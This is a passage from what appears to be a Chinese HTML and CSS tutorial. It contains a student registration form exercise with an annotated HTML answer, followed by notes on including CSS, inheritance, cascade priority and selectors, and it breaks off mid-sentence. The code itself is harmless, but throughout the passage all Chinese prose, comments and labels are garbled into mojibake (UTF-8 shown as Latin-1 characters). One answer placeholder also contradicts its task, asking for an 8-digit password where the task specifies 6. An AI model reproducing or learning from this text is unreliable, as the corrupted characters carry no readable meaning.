height=\"600px\"></iframe>\n</body>\n</html>\n```\nindexæ‰¿è½½frame3ï¼Œframe3æ‰¿è½½frame2ï¼Œframe2æ‰¿è½½frame1ï¼Œframe1ä¸­æ”¾å…¥è¶…é“¾æ¥\nä¸Šæ–¹ç¤ºä¾‹æ¼”ç¤ºï¼š\n![](https://i.loli.net/2020/03/10/bW4dCcAZzrVERP8.png)\n\n### å‚è€ƒ\n[HTML5 æ ‡ç­¾å«ä¹‰ä¹‹å…ƒç´ å‘¨æœŸè¡¨](http://www.html5star.com/manual/html5label-meaning/)\n[æå®¢å­¦é™¢-HTML](http://wiki.jikexueyuan.com/project/html5/overview.html)\n[èœé¸Ÿæ•™ç¨‹-HTML](https://www.runoob.com/html/html-tutorial.html)\n[W3cSchool-HTML](https://www.w3school.com.cn/html/html_jianjie.asp)\n\n## HTMLå®ä¾‹ç»ƒä¹ \n\n> ç›¸ä¿¡çœ‹å®Œå‰é¢éƒ¨åˆ†ï¼Œä½ å·²ç»æŒæ¡äº†HTMLï¼Œç„¶è€Œå¤§å¤šæ•°åŒå­¦å¯èƒ½è·Ÿæˆ‘ä¸€æ ·ï¼Œè¿˜æ˜¯ä¸å¤ªç†Ÿæ‚‰ï¼Œä¸èƒ½å¾ˆæµç•…çš„ä½¿ç”¨\n>\n> ä¸‹é¢é€šè¿‡å®ä¾‹æ¥å·©å›ºHTML\n\n### ç›®çš„\n\n- æŒæ¡å¸¸ç”¨çš„HTMLæ–‡æœ¬ã€è¶…é“¾æ¥å’Œå›¾åƒæ ‡ç­¾çš„ä½¿ç”¨ï¼›\n\n- æŒæ¡HTMLè¡¨æ ¼æ ‡ç­¾ï¼Œèƒ½å¤Ÿä½¿ç”¨è¡¨æ ¼è¿›è¡Œç®€å•çš„ç½‘é¡µå¸ƒå±€è®¾è®¡ï¼›\n\n- æŒæ¡HTMLè¡¨å•åº”ç”¨ï¼ŒåŒ…æ‹¬HTML5æ–°å¢çš„è¾“å…¥åŸŸç±»å‹å’Œå±æ€§çš„ä½¿ç”¨ã€‚\n\n### é¢˜ç›®\n\n**è¯·æŒ‰è¦æ±‚è®¾è®¡ä¸€ä¸ªå­¦ç”Ÿä¿¡æ¯æ³¨å†Œç½‘é¡µï¼Œå¯ä»¥ä½¿ç”¨è¡¨æ ¼å¸ƒå±€ï¼Œé¡µé¢å†…å®¹å±…ä¸­æ˜¾ç¤ºï¼Œå¦‚å›¾1æ‰€ç¤ºï¼Œä¸»è¦è¦æ±‚å¦‚ä¸‹ï¼š**\n\n> (1)\tè®¾ç½®é¡µé¢æ ‡é¢˜ä¸ºâ€œæ–°ç”ŸæŠ¥åˆ°â€ï¼›\n> (2)\tä½¿ç”¨h3æ ‡ç­¾å±…ä¸­æ˜¾ç¤ºâ€œæ³¨å†Œä¿¡æ¯â€ï¼Œå¹¶è®¾ç½®ä¸€ä¸ªé¡µé¢é¡¶éƒ¨é”šç‚¹ï¼›\n> (3)\tåœ¨æ³¨å†Œä¿¡æ¯å¡«å†™åŒºåŸŸå‰åè®¾ç½®æ°´å¹³åˆ†éš”çº¿ï¼›\n> (4)\tè¡¨å•ä½¿ç”¨getæäº¤æ–¹å¼ï¼Œè¡¨å•ä¸­æ‰€æœ‰è¾“å…¥åŸŸå¿…é¡»è®¾ç½®nameå±æ€§ï¼Œè®¾ç½®è¡¨å•çš„è‡ªåŠ¨å®ŒæˆåŠŸèƒ½ï¼›\n> (5)\tè®¾ç½®ç”¨æˆ·åã€å­¦å·å’Œå¯†ç ä¸ºå¿…å¡«é¡¹ï¼Œåœ¨è¾“å…¥åŸŸåæ˜¾ç¤ºçº¢è‰²â€œ*â€å·ï¼Œè®¾ç½®ç”¨æˆ·åè¾“å…¥æ¡†é»˜è®¤è·å¾—ç„¦ç‚¹ï¼Œå¯†ç è¾“å…¥æ¡†ä¸­ æç¤ºç”¨æˆ·â€œè¯·è¾“å…¥6ä½å¯†ç â€ï¼›\n> (6)\té™¤ç”¨æˆ·åã€å­¦å·ã€å¯†ç ã€å•é€‰æŒ‰é’®ã€å¤é€‰æ¡†ã€åˆ—è¡¨æ¡†å’Œæ–‡æœ¬åŒºä¹‹å¤–ï¼Œå…¶å®ƒinputå…ƒç´ å¿…é¡»ä¸ºHTML5æ–°å¢çš„è¾“å…¥ç±»å‹ï¼›\n> (7)\tæ€§åˆ«é»˜è®¤é€‰æ‹©â€œå¥³â€ï¼Œå€ŸåŠ©labelæ ‡ç­¾ä½¿å¾—ç”¨æˆ·å¯ä»¥é€šè¿‡å•é€‰æŒ‰é’®åçš„æ–‡æœ¬è¿›è¡Œå‹¾é€‰ï¼›\n> (8)\tèº«é«˜æœ€å¤§,æœ€å°,æ­¥é•¿å’Œé»˜è®¤å€¼åˆ†åˆ«ä¸º190,150,5,175å˜ç±³ï¼›ä½“é‡æœ€å¤§,æœ€å°,æ­¥é•¿å’Œé»˜è®¤å€¼åˆ†åˆ«ä¸º90,45,2,55åƒå…‹ï¼›\n> (9)\tç”µè¯å·ç è¾“å…¥æ¡†ä¸­æç¤ºâ€œè¯·è¾“å…¥11ä½â€æ•°å­—ï¼Œå¹¶è®¾ç½®patternå±æ€§è¿›è¡Œæ ¡éªŒï¼›\n> (10)\tå®¶åº­ä½å€ä¸‹æ‹‰åˆ—è¡¨ä¸­ä¾æ­¤è®¾ç½®â€œåŒ—äº¬ã€ä¸Šæµ·ã€æˆéƒ½â€ä¸‰ä¸ªé€‰é¡¹ï¼Œé»˜è®¤é€‰æ‹©â€œæˆéƒ½â€ï¼›\n> (11)\tå¤é€‰æ¡†ä¸­é»˜è®¤é€‰æ‹©è¶³çƒï¼›\n> (12)\tä½¿ç”¨datalistæ ‡ç­¾ä¸ºâ€œå–œæ¬¢çš„ç½‘ç«™â€è¾“å…¥æ¡†æä¾›å¯é€‰ç½‘å€åˆ—è¡¨ï¼Œå¦‚å›¾2æ‰€ç¤ºï¼›x\n> (13)\té‚®æ”¿ç¼–ç è¾“å…¥æ¡†ä¸­æç¤ºâ€œè¯·è¾“å…¥6ä½é‚®æ”¿ç¼–ç â€ï¼Œå¹¶è®¾ç½®patternå±æ€§è¿›è¡Œæ ¡éªŒï¼›x\n> (14)\tä¸Šä¼ 2å¼ ç”Ÿæ´»ç…§ï¼›\n> (15)\tä¸ªäººè‡ªè¿°æ–‡æœ¬åŒºè®¾ç½®è¡Œæ•°ä¸º5è¡Œï¼Œåˆ—æ•°ä¸º50ï¼Œé»˜è®¤æ˜¾ç¤ºæ–‡æœ¬â€œæˆ‘æ˜¯ä¸€ä½ç‰¹åˆ«çƒ­çˆ±å­¦ä¹ çš„å¥½å­©å­ã€‚ã€‚ã€‚â€\n> (16)\tæ’å…¥ä¸€ä¸ªéšè—åŸŸï¼Œè®¾ç½®valueå€¼ä¸ºä½ çš„å¹¸è¿æ•°å­—ï¼›\n> (17)\tè®¾ç½®â€œæ³¨å†Œâ€å’Œâ€œé‡ç½®â€ä¸¤ä¸ªæŒ‰é’®ï¼Œå±…ä¸­æ˜¾ç¤ºï¼›\n> (18)\tåœ¨é¡µé¢åº•éƒ¨æ’å…¥â€œç”µè¯â€ã€â€œçŸ­ä¿¡â€ã€â€œE-Mailâ€å’Œâ€œè¿”å›é¡¶éƒ¨â€4ä¸ªå¯¼èˆªé“¾æ¥ï¼Œå‰ä¸‰ä¸ªå¯¼èˆªé“¾æ¥å¿…é¡»ä½¿ç”¨ç›¸åº”çš„è¶…é“¾æ¥ä¼ªåè®®ï¼Œâ€œè¿”å›é¡¶éƒ¨â€é“¾æ¥åˆ°é¡µé¢é¡¶éƒ¨é”šç‚¹ã€‚å¦å¤–ï¼Œéœ€è®¾ç½®é“¾æ¥çŠ¶æ€æ ·å¼ï¼Œé“¾æ¥å­—ä½“ä¸ºè“è‰²ï¼Œå·²è®¿é—®è¿‡ä¸ºç°è‰²ï¼Œé¼ æ ‡ç»è¿‡æ˜¯ä¸ºçº¢è‰²ï¼Œé¼ æ ‡æŒ‰ä¸‹æ—¶ä¸ºé»„è‰²ã€‚\n\n| æ•ˆæœå›¾     | ![å›¾ä¸€](https://img.jwt1399.top//img/20200810113802.jpg) |\n| ---------- | -------------------------------------------------------- |\n| **æ•ˆæœå›¾** | ![å›¾äºŒ](https://img.jwt1399.top//img/20200810113809.jpg) |\n\n### è§£ç­”\n\n**å…·ä½“æ¯æ­¥ç­”æ¡ˆï¼Œè¯·å¯¹åº”çœ‹æ³¨é‡Š**\n\n```html\n<!doctype html>\n<html>\n\t<head>\n\t<meta charset=\"utf-8\">\n\t<!--<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, user-scalable=no\">-->\n\t<title>æ–°ç”ŸæŠ¥åˆ°</title><!--é¢˜ç›®1-->\n\t<style> /*é¢˜ç›®18*/\n\t\ta {text-decoration: none;}\t/*å®šä¹‰æ ‡å‡†çš„æ–‡æœ¬*/\n        a:link {color: blue;}\t/*ç‚¹å‡»å‰è“è‰²*/\n        a:visited {color: gray;}\t/*è®¿é—®åç°è‰²*/\n        a:hover {color: red;}\t/*é¼ æ ‡ç»è¿‡æ˜¯çº¢è‰²*/\n        a:active {color: yellow;}\t/*é¼ æ ‡æŒ‰ä¸‹æ—¶é»„è‰²*/\n\t</style>\n\t</head>\n\t<body>\n\t\t<h3 id=\"title\" align=\"center\">æ³¨ å†Œ ä¿¡ æ¯</h3><!--é¢˜ç›®2-->\n\t\t<hr noshade size=\"1\" width=\"80%\"><!--é¢˜ç›®3-->\n\t\t<form action=\"\" id=\"form1\" autocomplete=\"on\" method=\"get\"><!--é¢˜ç›®4-->\n\t\t\t<table  width=\"80%\" border=\"0\" align=\"center\" cellspacing=\"0\">\t\t\t\t\n\t\t\t\t<tr> <!--é¢˜ç›®5-->\n\t\t\t\t\t<td width=\"30%\" align=\"right\">å§“åï¼š</td>\n\t\t\t\t\t<td width=\"5%\"></td> \n\t\t\t\t\t<td align=\"left\"><input type=\"text\"  name=\"user_name\" maxlength=\"10\" autofocus required/><font color=\"#FF0000\"> *</font></td>\n\t\t\t\t</tr>\n\t\t\t\t\n\t\t\t\t<tr> <!--é¢˜ç›®5-->\n\t\t\t\t\t<td width=\"30%\" align=\"right\">å­¦å·ï¼š</td> \n\t\t\t\t\t<td></td> \n\t\t\t\t\t<td align=\"left\"><input type=\"text\"  name=\"user_id\" required/><font color=\"#FF0000\"> *</font></td>\n\t\t\t\t</tr>\n\t\t\t\t\n\t\t\t\t<tr> <!--é¢˜ç›®5--> \n\t\t\t\t\t<td width=\"30%\" align=\"right\">å¯†ç ï¼š</td> \n\t\t\t\t\t<td></td> \n\t\t\t\t\t<td align=\"left\"><input type=\"password\"  name=\"user_paw\"  placeholder=\"è¯·è¾“å…¥8ä½å¯†ç \" required /><font color=\"#FF0000\"> *</font></td>\n\t\t\t\t</tr>\n\t\t\t\t<tr> <!--é¢˜ç›®7-->\n\t\t\t\t\t<td width=\"30%\" align=\"right\">æ€§åˆ«ï¼š</td> \n\t\t\t\t\t<td></td> \n\t\t\t\t\t<td align=\"left\">\n                    <input type=\"radio\" id=\"male\" name=\"user_sex\" value=\"man\"/>  \n                    <label for=\"male\">ç”·</label>\n\t\t\t\t\t<input type=\"radio\" id=\"female\"  name=\"user_sex\" value=\"woman\" checked/>\n                    <label for=\"female\">å¥³</label></td>\n\t\t\t\t</tr>\n\t\t\t\t<tr> <!--é¢˜ç›®8-->\n\t\t\t\t\t<td width=\"30%\" align=\"right\">èº«é«˜ï¼š</td> \n\t\t\t\t\t<td></td> \n\t\t\t\t\t<td align=\"left\"><input type=\"number\"  name=\"user_height\" min=\"150\" max=\"190\" value=\"175\" step=\"5\" />å˜ç±³</td>\n\t\t\t\t</tr>\n\t\t\t\t<tr> <!--é¢˜ç›®8-->\n\t\t\t\t\t<td width=\"30%\" align=\"right\">ä½“é‡ï¼š</td> \n\t\t\t\t\t<td></td> \n\t\t\t\t\t<td align=\"left\"><input type=\"range\"  name=\"user_weight\" min=\"45\" max=\"90\" value=\"55\" step=\"2\" />åƒå…‹</td>\n\t\t\t\t</tr>\n\t\t\t\t\n\t\t\t\t<tr> \n\t\t\t\t\t<td width=\"30%\" align=\"right\">å‡ºç”Ÿæ—¥æœŸï¼š</td> \n\t\t\t\t\t<td></td> \n\t\t\t\t\t<td align=\"left\"><input type=\"date\"  name=\"user_birthday\"/></td>\n\t\t\t\t</tr>\n\t\t\t\t\n\t\t\t\t<tr> <!--é¢˜ç›®9-->\n\t\t\t\t\t<td width=\"30%\" align=\"right\">ç”µè¯å·ç ï¼š</td> \n\t\t\t\t\t<td></td> \n\t\t\t\t\t<td align=\"left\"><input type=\"tel\"  name=\"user_tel\" pattern=\"\\d{11}\" placeholder=\"è¯·è¾“å…¥11æ‰‹æœºå·ç \"/></td>\n\t\t\t\t</tr>\n\t\t\t\t\n\t\t\t\t<tr> \n\t\t\t\t\t<td width=\"30%\" align=\"right\">E-mailï¼š</td> \n\t\t\t\t\t<td></td> \n\t\t\t\t\t<td align=\"left\"><input type=\"email\"  name=\"user_email\"/></td>\n\t\t\t\t</tr>\n\t\t\t\t\n\t\t\t\t<tr> \n\t\t\t\t\t<td width=\"30%\" align=\"right\">ä¸ªäººä¸»é¡µï¼š</td> \n\t\t\t\t\t<td></td> \n\t\t\t\t\t<td align=\"left\"><input type=\"url\"  name=\"user_homepage\" autocomplete=\"off\"/></td>\n\t\t\t\t</tr>\n\t\t\t\t\n\t\t\t\t<tr> <!--é¢˜ç›®10-->\n\t\t\t\t\t<td width=\"30%\" align=\"right\">å®¶åº­ä½å€ï¼š</td> \n\t\t\t\t\t<td></td> \n\t\t\t\t\t<td align=\"left\"><select name=\"user_address\" >\n\t\t\t\t\t<option value=\"0\" >åŒ—äº¬</option>\n\t\t\t\t\t<option value=\"1\" >ä¸Šæµ·</option>\n\t\t\t\t\t<option value=\"2\" selected>æˆéƒ½</option>\n\t\t\t\t</select></td>\n\t\t\t\t</tr>\n\t\t\t\t\n\t\t\t\t<tr> <!--é¢˜ç›®13-->\n\t\t\t\t\t<td width=\"30%\" align=\"right\">é‚®æ”¿ç¼–ç ï¼š</td>\n\t\t\t\t\t<td></td>  \n\t\t\t\t\t<td align=\"left\"><input type=\"text\"  name=\"user_zipcode\" pattern=\"[0-9]{6}\" placeholder=\"è¯·è¾“å…¥6ä½é‚®æ”¿ç¼–ç \" /></td>\n\t\t\t\t</tr>\n\t\t\t\t\n\t\t\t\t<tr> \n\t\t\t\t\t<td width=\"30%\" align=\"right\">å–œæ¬¢çš„é¢œè‰²ï¼š</td> \n\t\t\t\t\t<td></td> \n\t\t\t\t\t<td align=\"left\"><input type=\"color\"  name=\"user_color\"/></td>\n\t\t\t\t</tr>\n\t\t\t\t\n\t\t\t\t<tr> <!--é¢˜ç›®11-->\n\t\t\t\t\t<td width=\"30%\" align=\"right\">å–œæ¬¢çš„è¿åŠ¨ï¼š</td> \n\t\t\t\t\t<td></td> \n\t\t\t\t\t<td align=\"left\"><input type=\"checkbox\" name=\"user_habit1\" value=\"basketball\"/>ç¯®çƒ\n\t\t\t<input type=\"checkbox\" name=\"user_habit2\" value=\"football\" checked>è¶³çƒ\n\t\t\t<input type=\"checkbox\" name=\"user_habit3\" value=\"swimming\">æ¸¸æ³³ </td>\n\t\t\t\t</tr>\n\t\t\t\t\n\t\t\t\t<tr> <!--é¢˜ç›®12-->\n\t\t\t\t\t<td width=\"30%\" align=\"right\">å–œæ¬¢çš„ç½‘ç«™ï¼š</td> \n\t\t\t\t\t<td></td> \n\t\t\t\t\t<td align=\"left\"><input type=\"url\" name=\"user_favurl\" list=\"urllist\"/>\n\t\t\t<datalist id=\"urllist\" >\n\t\t\t\t\t<option label=\"ç™¾åº¦\" value=\"http://www.baidu.com\"/>\n\t\t\t\t\t<option label=\"æ–°æµª\" value=\"http://www.sina.com\"/>\n\t\t\t\t\t<option label=\"è°·æ­Œ\" value=\"http://www.google.com\"/>\n\t\t\t\t\t<option value=\"http://www.163.com\">ç½‘æ˜“</option>\n\t\t\t</datalist></td>\n\t\t\t\t</tr>\n\t\t\t\t\n\t\t\t\t<tr> <!--é¢˜ç›®14-->\n\t\t\t\t\t<td width=\"30%\" align=\"right\">ç”Ÿæ´»ç…§2å¼ ï¼š</td> \n\t\t\t\t\t<td></td> \n\t\t\t\t\t<td align=\"left\"><input type=\"file\"  name=\"user_album\"  multiple/></td>\n\t\t\t\t</tr>\n\t\t\t\t\n\t\t\t\t<tr> <!--é¢˜ç›®15-->\n\t\t\t\t\t<td width=\"30%\" align=\"right\" valign=\"top\">ä¸ªäººè‡ªè¿°ï¼š</td> \n\t\t\t\t\t<td></td> \n\t\t\t\t\t<td align=\"left\"><textarea name=\"info\" rows=\"5\" cols=\"50\">æˆ‘æ˜¯ä¸€ä½ç‰¹åˆ«çƒ­çˆ±å­¦ä¹ çš„å¥½å­©å­ã€‚ã€‚ã€‚</textarea></td>\n\t\t\t\t</tr>\n\t\t\t\t\n\t\t\t\t<tr> \n\t\t\t\t\t<td width=\"30%\" align=\"center\" colspan=\"3\">\n\t\t\t\t\t<input type=\"hidden\" name=\"user_secret\" value=\"7\"/><!--é¢˜ç›®16-->\n\t\t\t\t\t<pre><input type=\"submit\" value=\"æ³¨å†Œ\"/>               <input type=\"reset\" value=\"é‡ç½®\" /></pre><!--é¢˜ç›®17-->\n\t\t\t</td> \n\t\t\t\t</tr>\n\t\t\t\t\n\t\t\t\t<tr><!--é¢˜ç›®3-->\n\t\t\t\t\t<td colspan=\"3\"><hr noshade size=\"1\" width=\"100%\"></td>\n\t\t\t\t</tr>\n\t\t\t\n\t\t\t\t<tr> \n\t\t\t\t\t<td colspan=\"3\">\n\t\t\t\t\t\t<table width=\"100%\"><!--é¢˜ç›®18-->\n\t\t\t\t\t\t\t<tr align=\"center\">\n\t\t\t\t\t\t\t\t<td width=\"25%\"><a href=\"tel:10086\">ç”µè¯</a></td>\n\t\t\t\t\t\t\t\t<td width=\"25%\"><a href=\"sms:10086\">çŸ­ä¿¡</a></td>\n\t\t\t\t\t\t\t\t<td width=\"25%\"><a href=\"mailto:10086@sina.com\">E-mail</a></td>\n\t\t\t\t\t\t\t\t<td width=\"25%\"><a href=\"#title\">è¿”å›é¡¶éƒ¨</a></td>\n\t\t\t\t\t\t\t</tr>\n\t\t\t\t\t\t</table>\n\t\t\t\t\t</td> \t\n\t\t\t\t</tr>\n\t\t\t\t\n\t\t\t</table>\n\t</form>\n\t\t\t\n</body>\n</html>\n```\n\n## CSS\n\n>CSS æŒ‡å±‚å æ ·å¼è¡¨ (Cascading Style Sheets),å®šä¹‰å¦‚ä½•æ˜¾ç¤º HTML å…ƒç´ \n\n### 1 åŸºç¡€\n\nCSS è§„åˆ™ç”±ä¸¤ä¸ªä¸»è¦çš„éƒ¨åˆ†æ„æˆï¼šé€‰æ‹©å™¨ï¼Œä»¥åŠä¸€æ¡æˆ–å¤šæ¡å£°æ˜ã€‚\n```html\nselector {declaration1; declaration2; ... declarationN }\n```\né€‰æ‹©å™¨é€šå¸¸æ˜¯æ‚¨éœ€è¦æ”¹å˜æ ·å¼çš„`HTML`å…ƒç´ ã€‚\næ¯æ¡å£°æ˜ç”±ä¸€ä¸ªå±æ€§å’Œä¸€ä¸ªå€¼ç»„æˆã€‚\n\nä¸‹é¢è¿™è¡Œä»£ç çš„ä½œç”¨æ˜¯å°†`h1`å…ƒç´ å†…çš„æ–‡å­—é¢œè‰²å®šä¹‰ä¸ºçº¢è‰²ï¼ŒåŒæ—¶å°†å­—ä½“å¤§å°è®¾ç½®ä¸º 14 åƒç´ ã€‚\n![](https://i.loli.net/2019/08/14/GwTfQ8bJ4e67vSW.png)\nHTMLå¼•å…¥CSS\n\nå¤–éƒ¨(é“¾æ¥)æ ·å¼ï¼š(æ”¾åœ¨headä¸­)\n\n```html\n<link rel=\"stylesheet\" type=\"text/css\" href=\"xxx.css\">\n```\nxxx.css\n```css\np{\n    color:red;\n }\n```\nå†…åµŒæ ·å¼ï¼š(æ”¾åœ¨headä¸­)\n```css\n<style type=\"text/css\">\np{\n    color:red;\n}\n</style>\n```\n\nè¡Œå†…æ ·å¼ï¼š\n\n```html\n<p style=\"color:red;\"></p>\n```\n\nå¯¼å…¥æ ·å¼ï¼š\n\n```css\n<style>\n\t\t@import url(\"style/mystyle.css\");\n</style>\n```\n\n> å¯¼å…¥æ ·å¼ä¸é“¾æ¥æ ·å¼çš„åŒºåˆ«ï¼š\n>\n> å¯¼å…¥æ ·å¼åœ¨HTMLæ–‡ä»¶åˆå§‹åŒ–æ—¶è¢«å¯¼å…¥åˆ°æ–‡ä»¶ä¸­ï¼Œä½œä¸ºæ–‡ä»¶çš„ä¸€éƒ¨åˆ†ï¼›é“¾æ¥æ ·å¼æ˜¯åœ¨HTMLæ ‡è®°éœ€è¦æ ·å¼é£æ ¼æ—¶æ‰ä»¥é“¾æ¥æ–¹å¼å¼•å…¥ã€‚æ˜¾ç„¶ï¼Œé“¾æ¥æ ·å¼å¯åŠ å¿«é¡µé¢çš„åˆå§‹åŒ–ã€‚\n\nä¼˜å…ˆçº§ï¼šè¡Œå†…æ ·å¼ã€‹ã€‹å†…åµŒæ ·å¼ã€‹ã€‹é“¾æ¥æ ·å¼ã€‹ã€‹å¯¼å…¥æ ·å¼\n\n### 2 ç»§æ‰¿åŠå…¶é—®é¢˜\n\næ ¹æ® CSSï¼Œå­å…ƒç´ ä»çˆ¶å…ƒç´ ç»§æ‰¿å±æ€§ã€‚ä½†æ˜¯å®ƒå¹¶ä¸æ€»æ˜¯æŒ‰æ­¤æ–¹å¼å·¥ä½œã€‚çœ‹çœ‹ä¸‹é¢è¿™æ¡è§„åˆ™ï¼š\n\n```css\nbody {\n     color:red;\n     }\n```\né€šè¿‡ CSS ç»§æ‰¿ï¼Œå­å…ƒç´ å°†ç»§æ‰¿æœ€é«˜çº§å…ƒç´ ï¼ˆåœ¨æœ¬ä¾‹ä¸­æ˜¯ bodyï¼‰æ‰€æ‹¥æœ‰çš„å±æ€§ï¼ˆè¿™äº›å­å…ƒç´ è¯¸å¦‚ p, td, ul, ol, ul, li, dl, dt,å’Œ ddï¼‰ã€‚ä¸éœ€è¦å¦å¤–çš„è§„åˆ™ï¼Œæ‰€æœ‰ body çš„å­å…ƒç´ éƒ½åº”è¯¥æ˜¾ç¤ºçº¢è‰²ï¼Œå­å…ƒç´ çš„å­å…ƒç´ ä¹Ÿä¸€æ ·ã€‚\n\nå¦‚æœä½ ä¸å¸Œæœ›`\"color:red\"`è¢«æ‰€æœ‰çš„å­å…ƒç´ ç»§æ‰¿ï¼Œæ¯”æ–¹è¯´ï¼Œä½ å¸Œæœ›æ®µè½é¢œè‰²æ˜¯`green`ã€‚é‡æ–°åˆ›å»ºä¸€ä¸ªé’ˆå¯¹`p`çš„ç‰¹æ®Šè§„åˆ™ï¼Œè¿™æ ·å®ƒå°±ä¼šæ‘†è„±çˆ¶å…ƒç´ çš„è§„åˆ™ï¼š\n```css\nbody  {\n    color:red;\n     }\n\np  {\n     color:green;\n     }\n```\n### 3 CSSçš„å±‚å æ€§\n\nä¸€ä¸ªå…ƒç´ è¢«åŒä¸€é€‰æ‹©å™¨å¤šæ¬¡å®šä¹‰ï¼Œæˆ–è¢«å¤šä¸ªç±»é€‰æ‹©å™¨é€‰ä¸­æ—¶ï¼Œ**é‡‡ç”¨æœ€åè¢«å®šä¹‰çš„æ ·å¼**\n\n```css\nå®ä¾‹ï¼š  h1{color: red;}\n\t   h1{color: blue;} #é‡‡ç”¨æœ€åè¢«å®šä¹‰çš„æ ·å¼\n\n\nå®ä¾‹ï¼š\t.purple{color: purple;}\n\t  .red{color: red;}\n\t <p class=\"purple red\">ç±»é€‰æ‹©å™¨</p> #é‡‡ç”¨æœ€åè¢«å®šä¹‰çš„æ ·å¼\n\n```\n\nå½“åŒä¸€å…ƒç´ è¢«ä¸åŒé€‰æ‹©å™¨é€‰ä¸­æ—¶ï¼Œä¸€èˆ¬çš„é‡‡ç”¨å°±è¿‘åŸåˆ™\n\nä¼˜å…ˆçº§å…³ç³»ï¼šIDé€‰æ‹©å™¨ã€‹ç±»é€‰æ‹©å™¨ã€‹æ ‡ç­¾é€‰æ‹©å™¨\n\n```html\n<!DOCTYPE html >\n<head>\n<title>å±‚å ç‰¹æ€§</title>\n<style type=\"text/css\">\n\tp{color:black;}\n\t.red{color:red;}\n\t.purple {color:purple;}\n\t#p1{color:blue;}\n</style>\n</head>\n<body>\n\t<p >è¿™æ˜¯ç¬¬1è¡Œæ–‡æœ¬</p>\n\t<p class=\"red\">è¿™æ˜¯ç¬¬2è¡Œæ–‡æœ¬</p> <!--ç±»é€‰æ‹©å™¨ä¼˜å…ˆä¸æ ‡ç­¾é€‰æ‹©å™¨-->\n\t<p id=\"p1\" class=\"red\">è¿™æ˜¯ç¬¬3è¡Œæ–‡æœ¬</p><!--idé€‰æ‹©å™¨ä¼˜å…ˆ-->\n\t<p style=\"color:green;\" id=\"p1\">è¿™æ˜¯ç¬¬4è¡Œæ–‡æœ¬</p><!--è¡Œå†…æ ·å¼ä¼˜å…ˆ-->\n\t<p class=\"purple red\">è¿™æ˜¯ç¬¬5è¡Œæ–‡æœ¬</p> <!--é‡‡ç”¨æœ€åè¢«å®šä¹‰çš„æ ·å¼purple-->\n</body>\n</html>\n```\n\n![](https://i.loli.net/2020/03/31/KxzA8aHUtEOnoSw.png)\n\n### 4 é€‰æ‹©å™¨\n\n| **ç±»å‹**   | **åŸºæœ¬è¯­æ³•**                | **è¯´æ˜**                     |\n| ---------- | --------------------------- | ---------------------------- |\n| æ ‡ç­¾é€‰æ‹©å™¨ | body{property:  value}      | é€‚ç”¨äºæ ‡ç­¾ä¸­çš„æ‰€æœ‰å…ƒç´        |\n| IDé€‰æ‹©å™¨   | #id{property: value}        | é’ˆå¯¹ç‰¹å®šï¼ˆä¸€ä¸ªï¼‰å…ƒç´          |\n| ç±»é€‰æ‹©å™¨   | **.**class{property: value} | ä¸ºä¸€ç³»åˆ—å…ƒç´ å®šä¹‰ç›¸åŒæ ·å¼     |\n| å…¨å±€é€‰æ‹©å™¨ | *{property: value}          | è¡¨ç¤ºå¯¹æ‰€æœ‰å…ƒç´ èµ·ä½œç”¨         |\n| å±æ€§é€‰æ‹©å™¨ | [title] { property: value } | å¯¹å¸¦æœ‰æŒ‡å®šå±æ€§çš„å…ƒç´ è®¾ç½®æ ·å¼ |\n\n#### æ ‡ç­¾é€‰æ‹©å™¨\n\n> é€‚ç”¨äºæ ‡ç­¾ä¸­çš„æ‰€æœ‰å…ƒç´ \n\n```css\nbody {font-style: italic;}\n```\n\n#### 4.1 idé€‰æ‹©å™¨\n\n> å¯ä»¥ä¸ºæ ‡æœ‰ç‰¹å®š id çš„ HTML å…ƒç´ æŒ‡å®šç‰¹å®šçš„æ ·å¼ã€‚\n\nid é€‰æ‹©å™¨ä»¥ \"#\" æ¥å®šä¹‰ã€‚\nä¸‹é¢çš„ä¸¤ä¸ª id é€‰æ‹©å™¨ï¼Œç¬¬ä¸€ä¸ªå¯ä»¥å®šä¹‰å…ƒç´ çš„é¢œè‰²ä¸ºçº¢è‰²ï¼Œç¬¬äºŒä¸ªå®šä¹‰å…ƒç´ çš„é¢œè‰²ä¸ºç»¿è‰²ï¼š\n\n```css\n#a {color:red;}\n#b {color:green;}\n```\nä¸‹é¢çš„ HTML ä»£ç ä¸­ï¼Œid å±æ€§ä¸º a çš„ p å…ƒç´ æ˜¾ç¤ºä¸ºçº¢è‰²ï¼Œè€Œ id å±æ€§ä¸º b çš„ p å…ƒç´ æ˜¾ç¤ºä¸ºç»¿è‰²ã€‚\n```css\n<p id=\"a\">è¿™ä¸ªæ®µè½æ˜¯çº¢è‰²ã€‚</p>\n<p id=\"b\">è¿™ä¸ªæ®µè½æ˜¯ç»¿è‰²ã€‚</p>\n```\n#### 4.2 ç±»é€‰æ‹©å™¨\n\n> ä¸ºä¸€ç³»åˆ—å…ƒç´ å®šä¹‰ç›¸åŒæ ·å¼\n\nåœ¨ CSS ä¸­ï¼Œç±»é€‰æ‹©å™¨ä»¥ä¸€ä¸ªç‚¹å·æ˜¾ç¤ºï¼š\n```\n.A {text-align: center}\n```\næ‰€æœ‰æ‹¥æœ‰ A ç±»çš„ HTML å…ƒç´ å‡ä¸ºå±…ä¸­ã€‚\n\nåœ¨ä¸‹é¢çš„ HTML ä»£ç ä¸­ï¼Œh1 å’Œ p å…ƒç´ éƒ½æœ‰ A ç±»ã€‚è¿™æ„å‘³ç€ä¸¤è€…éƒ½å°†éµå®ˆ \".A\" é€‰æ‹©å™¨ä¸­çš„è§„åˆ™ã€‚\n```html\n<h1 class=\"A\">\nThis heading will be center-aligned\n</h1>\n\n<p class=\"A\">\nThis paragraph will also be center-aligned.\n</p>\n```\n#### 4.3 å…¨å±€é€‰æ‹©å™¨\n\n> å¯¹æ‰€æœ‰å…ƒç´ èµ·ä½œç”¨\n\n```css\n*{\n  color:red;\n  font-size:30px\n}\n```\n\n#### 4.4 å±æ€§é€‰æ‹©å™¨\n\n> å¯¹å¸¦æœ‰æŒ‡å®šå±æ€§çš„ HTML å…ƒç´ è®¾ç½®æ ·å¼ã€‚\n\nä¸‹é¢çš„ä¾‹å­ä¸ºå¸¦æœ‰`title`å±æ€§çš„æ‰€æœ‰å…ƒç´ è®¾ç½®æ ·å¼ï¼š\n```css\n[title]\n{\ncolor:red;\n}\n```\n\n>å±æ€§å’Œå€¼é€‰æ‹©å™¨:å¯¹å¸¦æœ‰æŒ‡å®šå±æ€§å’Œå€¼çš„ HTML å…ƒç´ è®¾ç½®æ ·å¼ã€‚\n\nä¸‹é¢çš„ä¾‹å­ä¸º`title=\"jwt\"`çš„æ‰€æœ‰å…ƒç´ è®¾ç½®æ 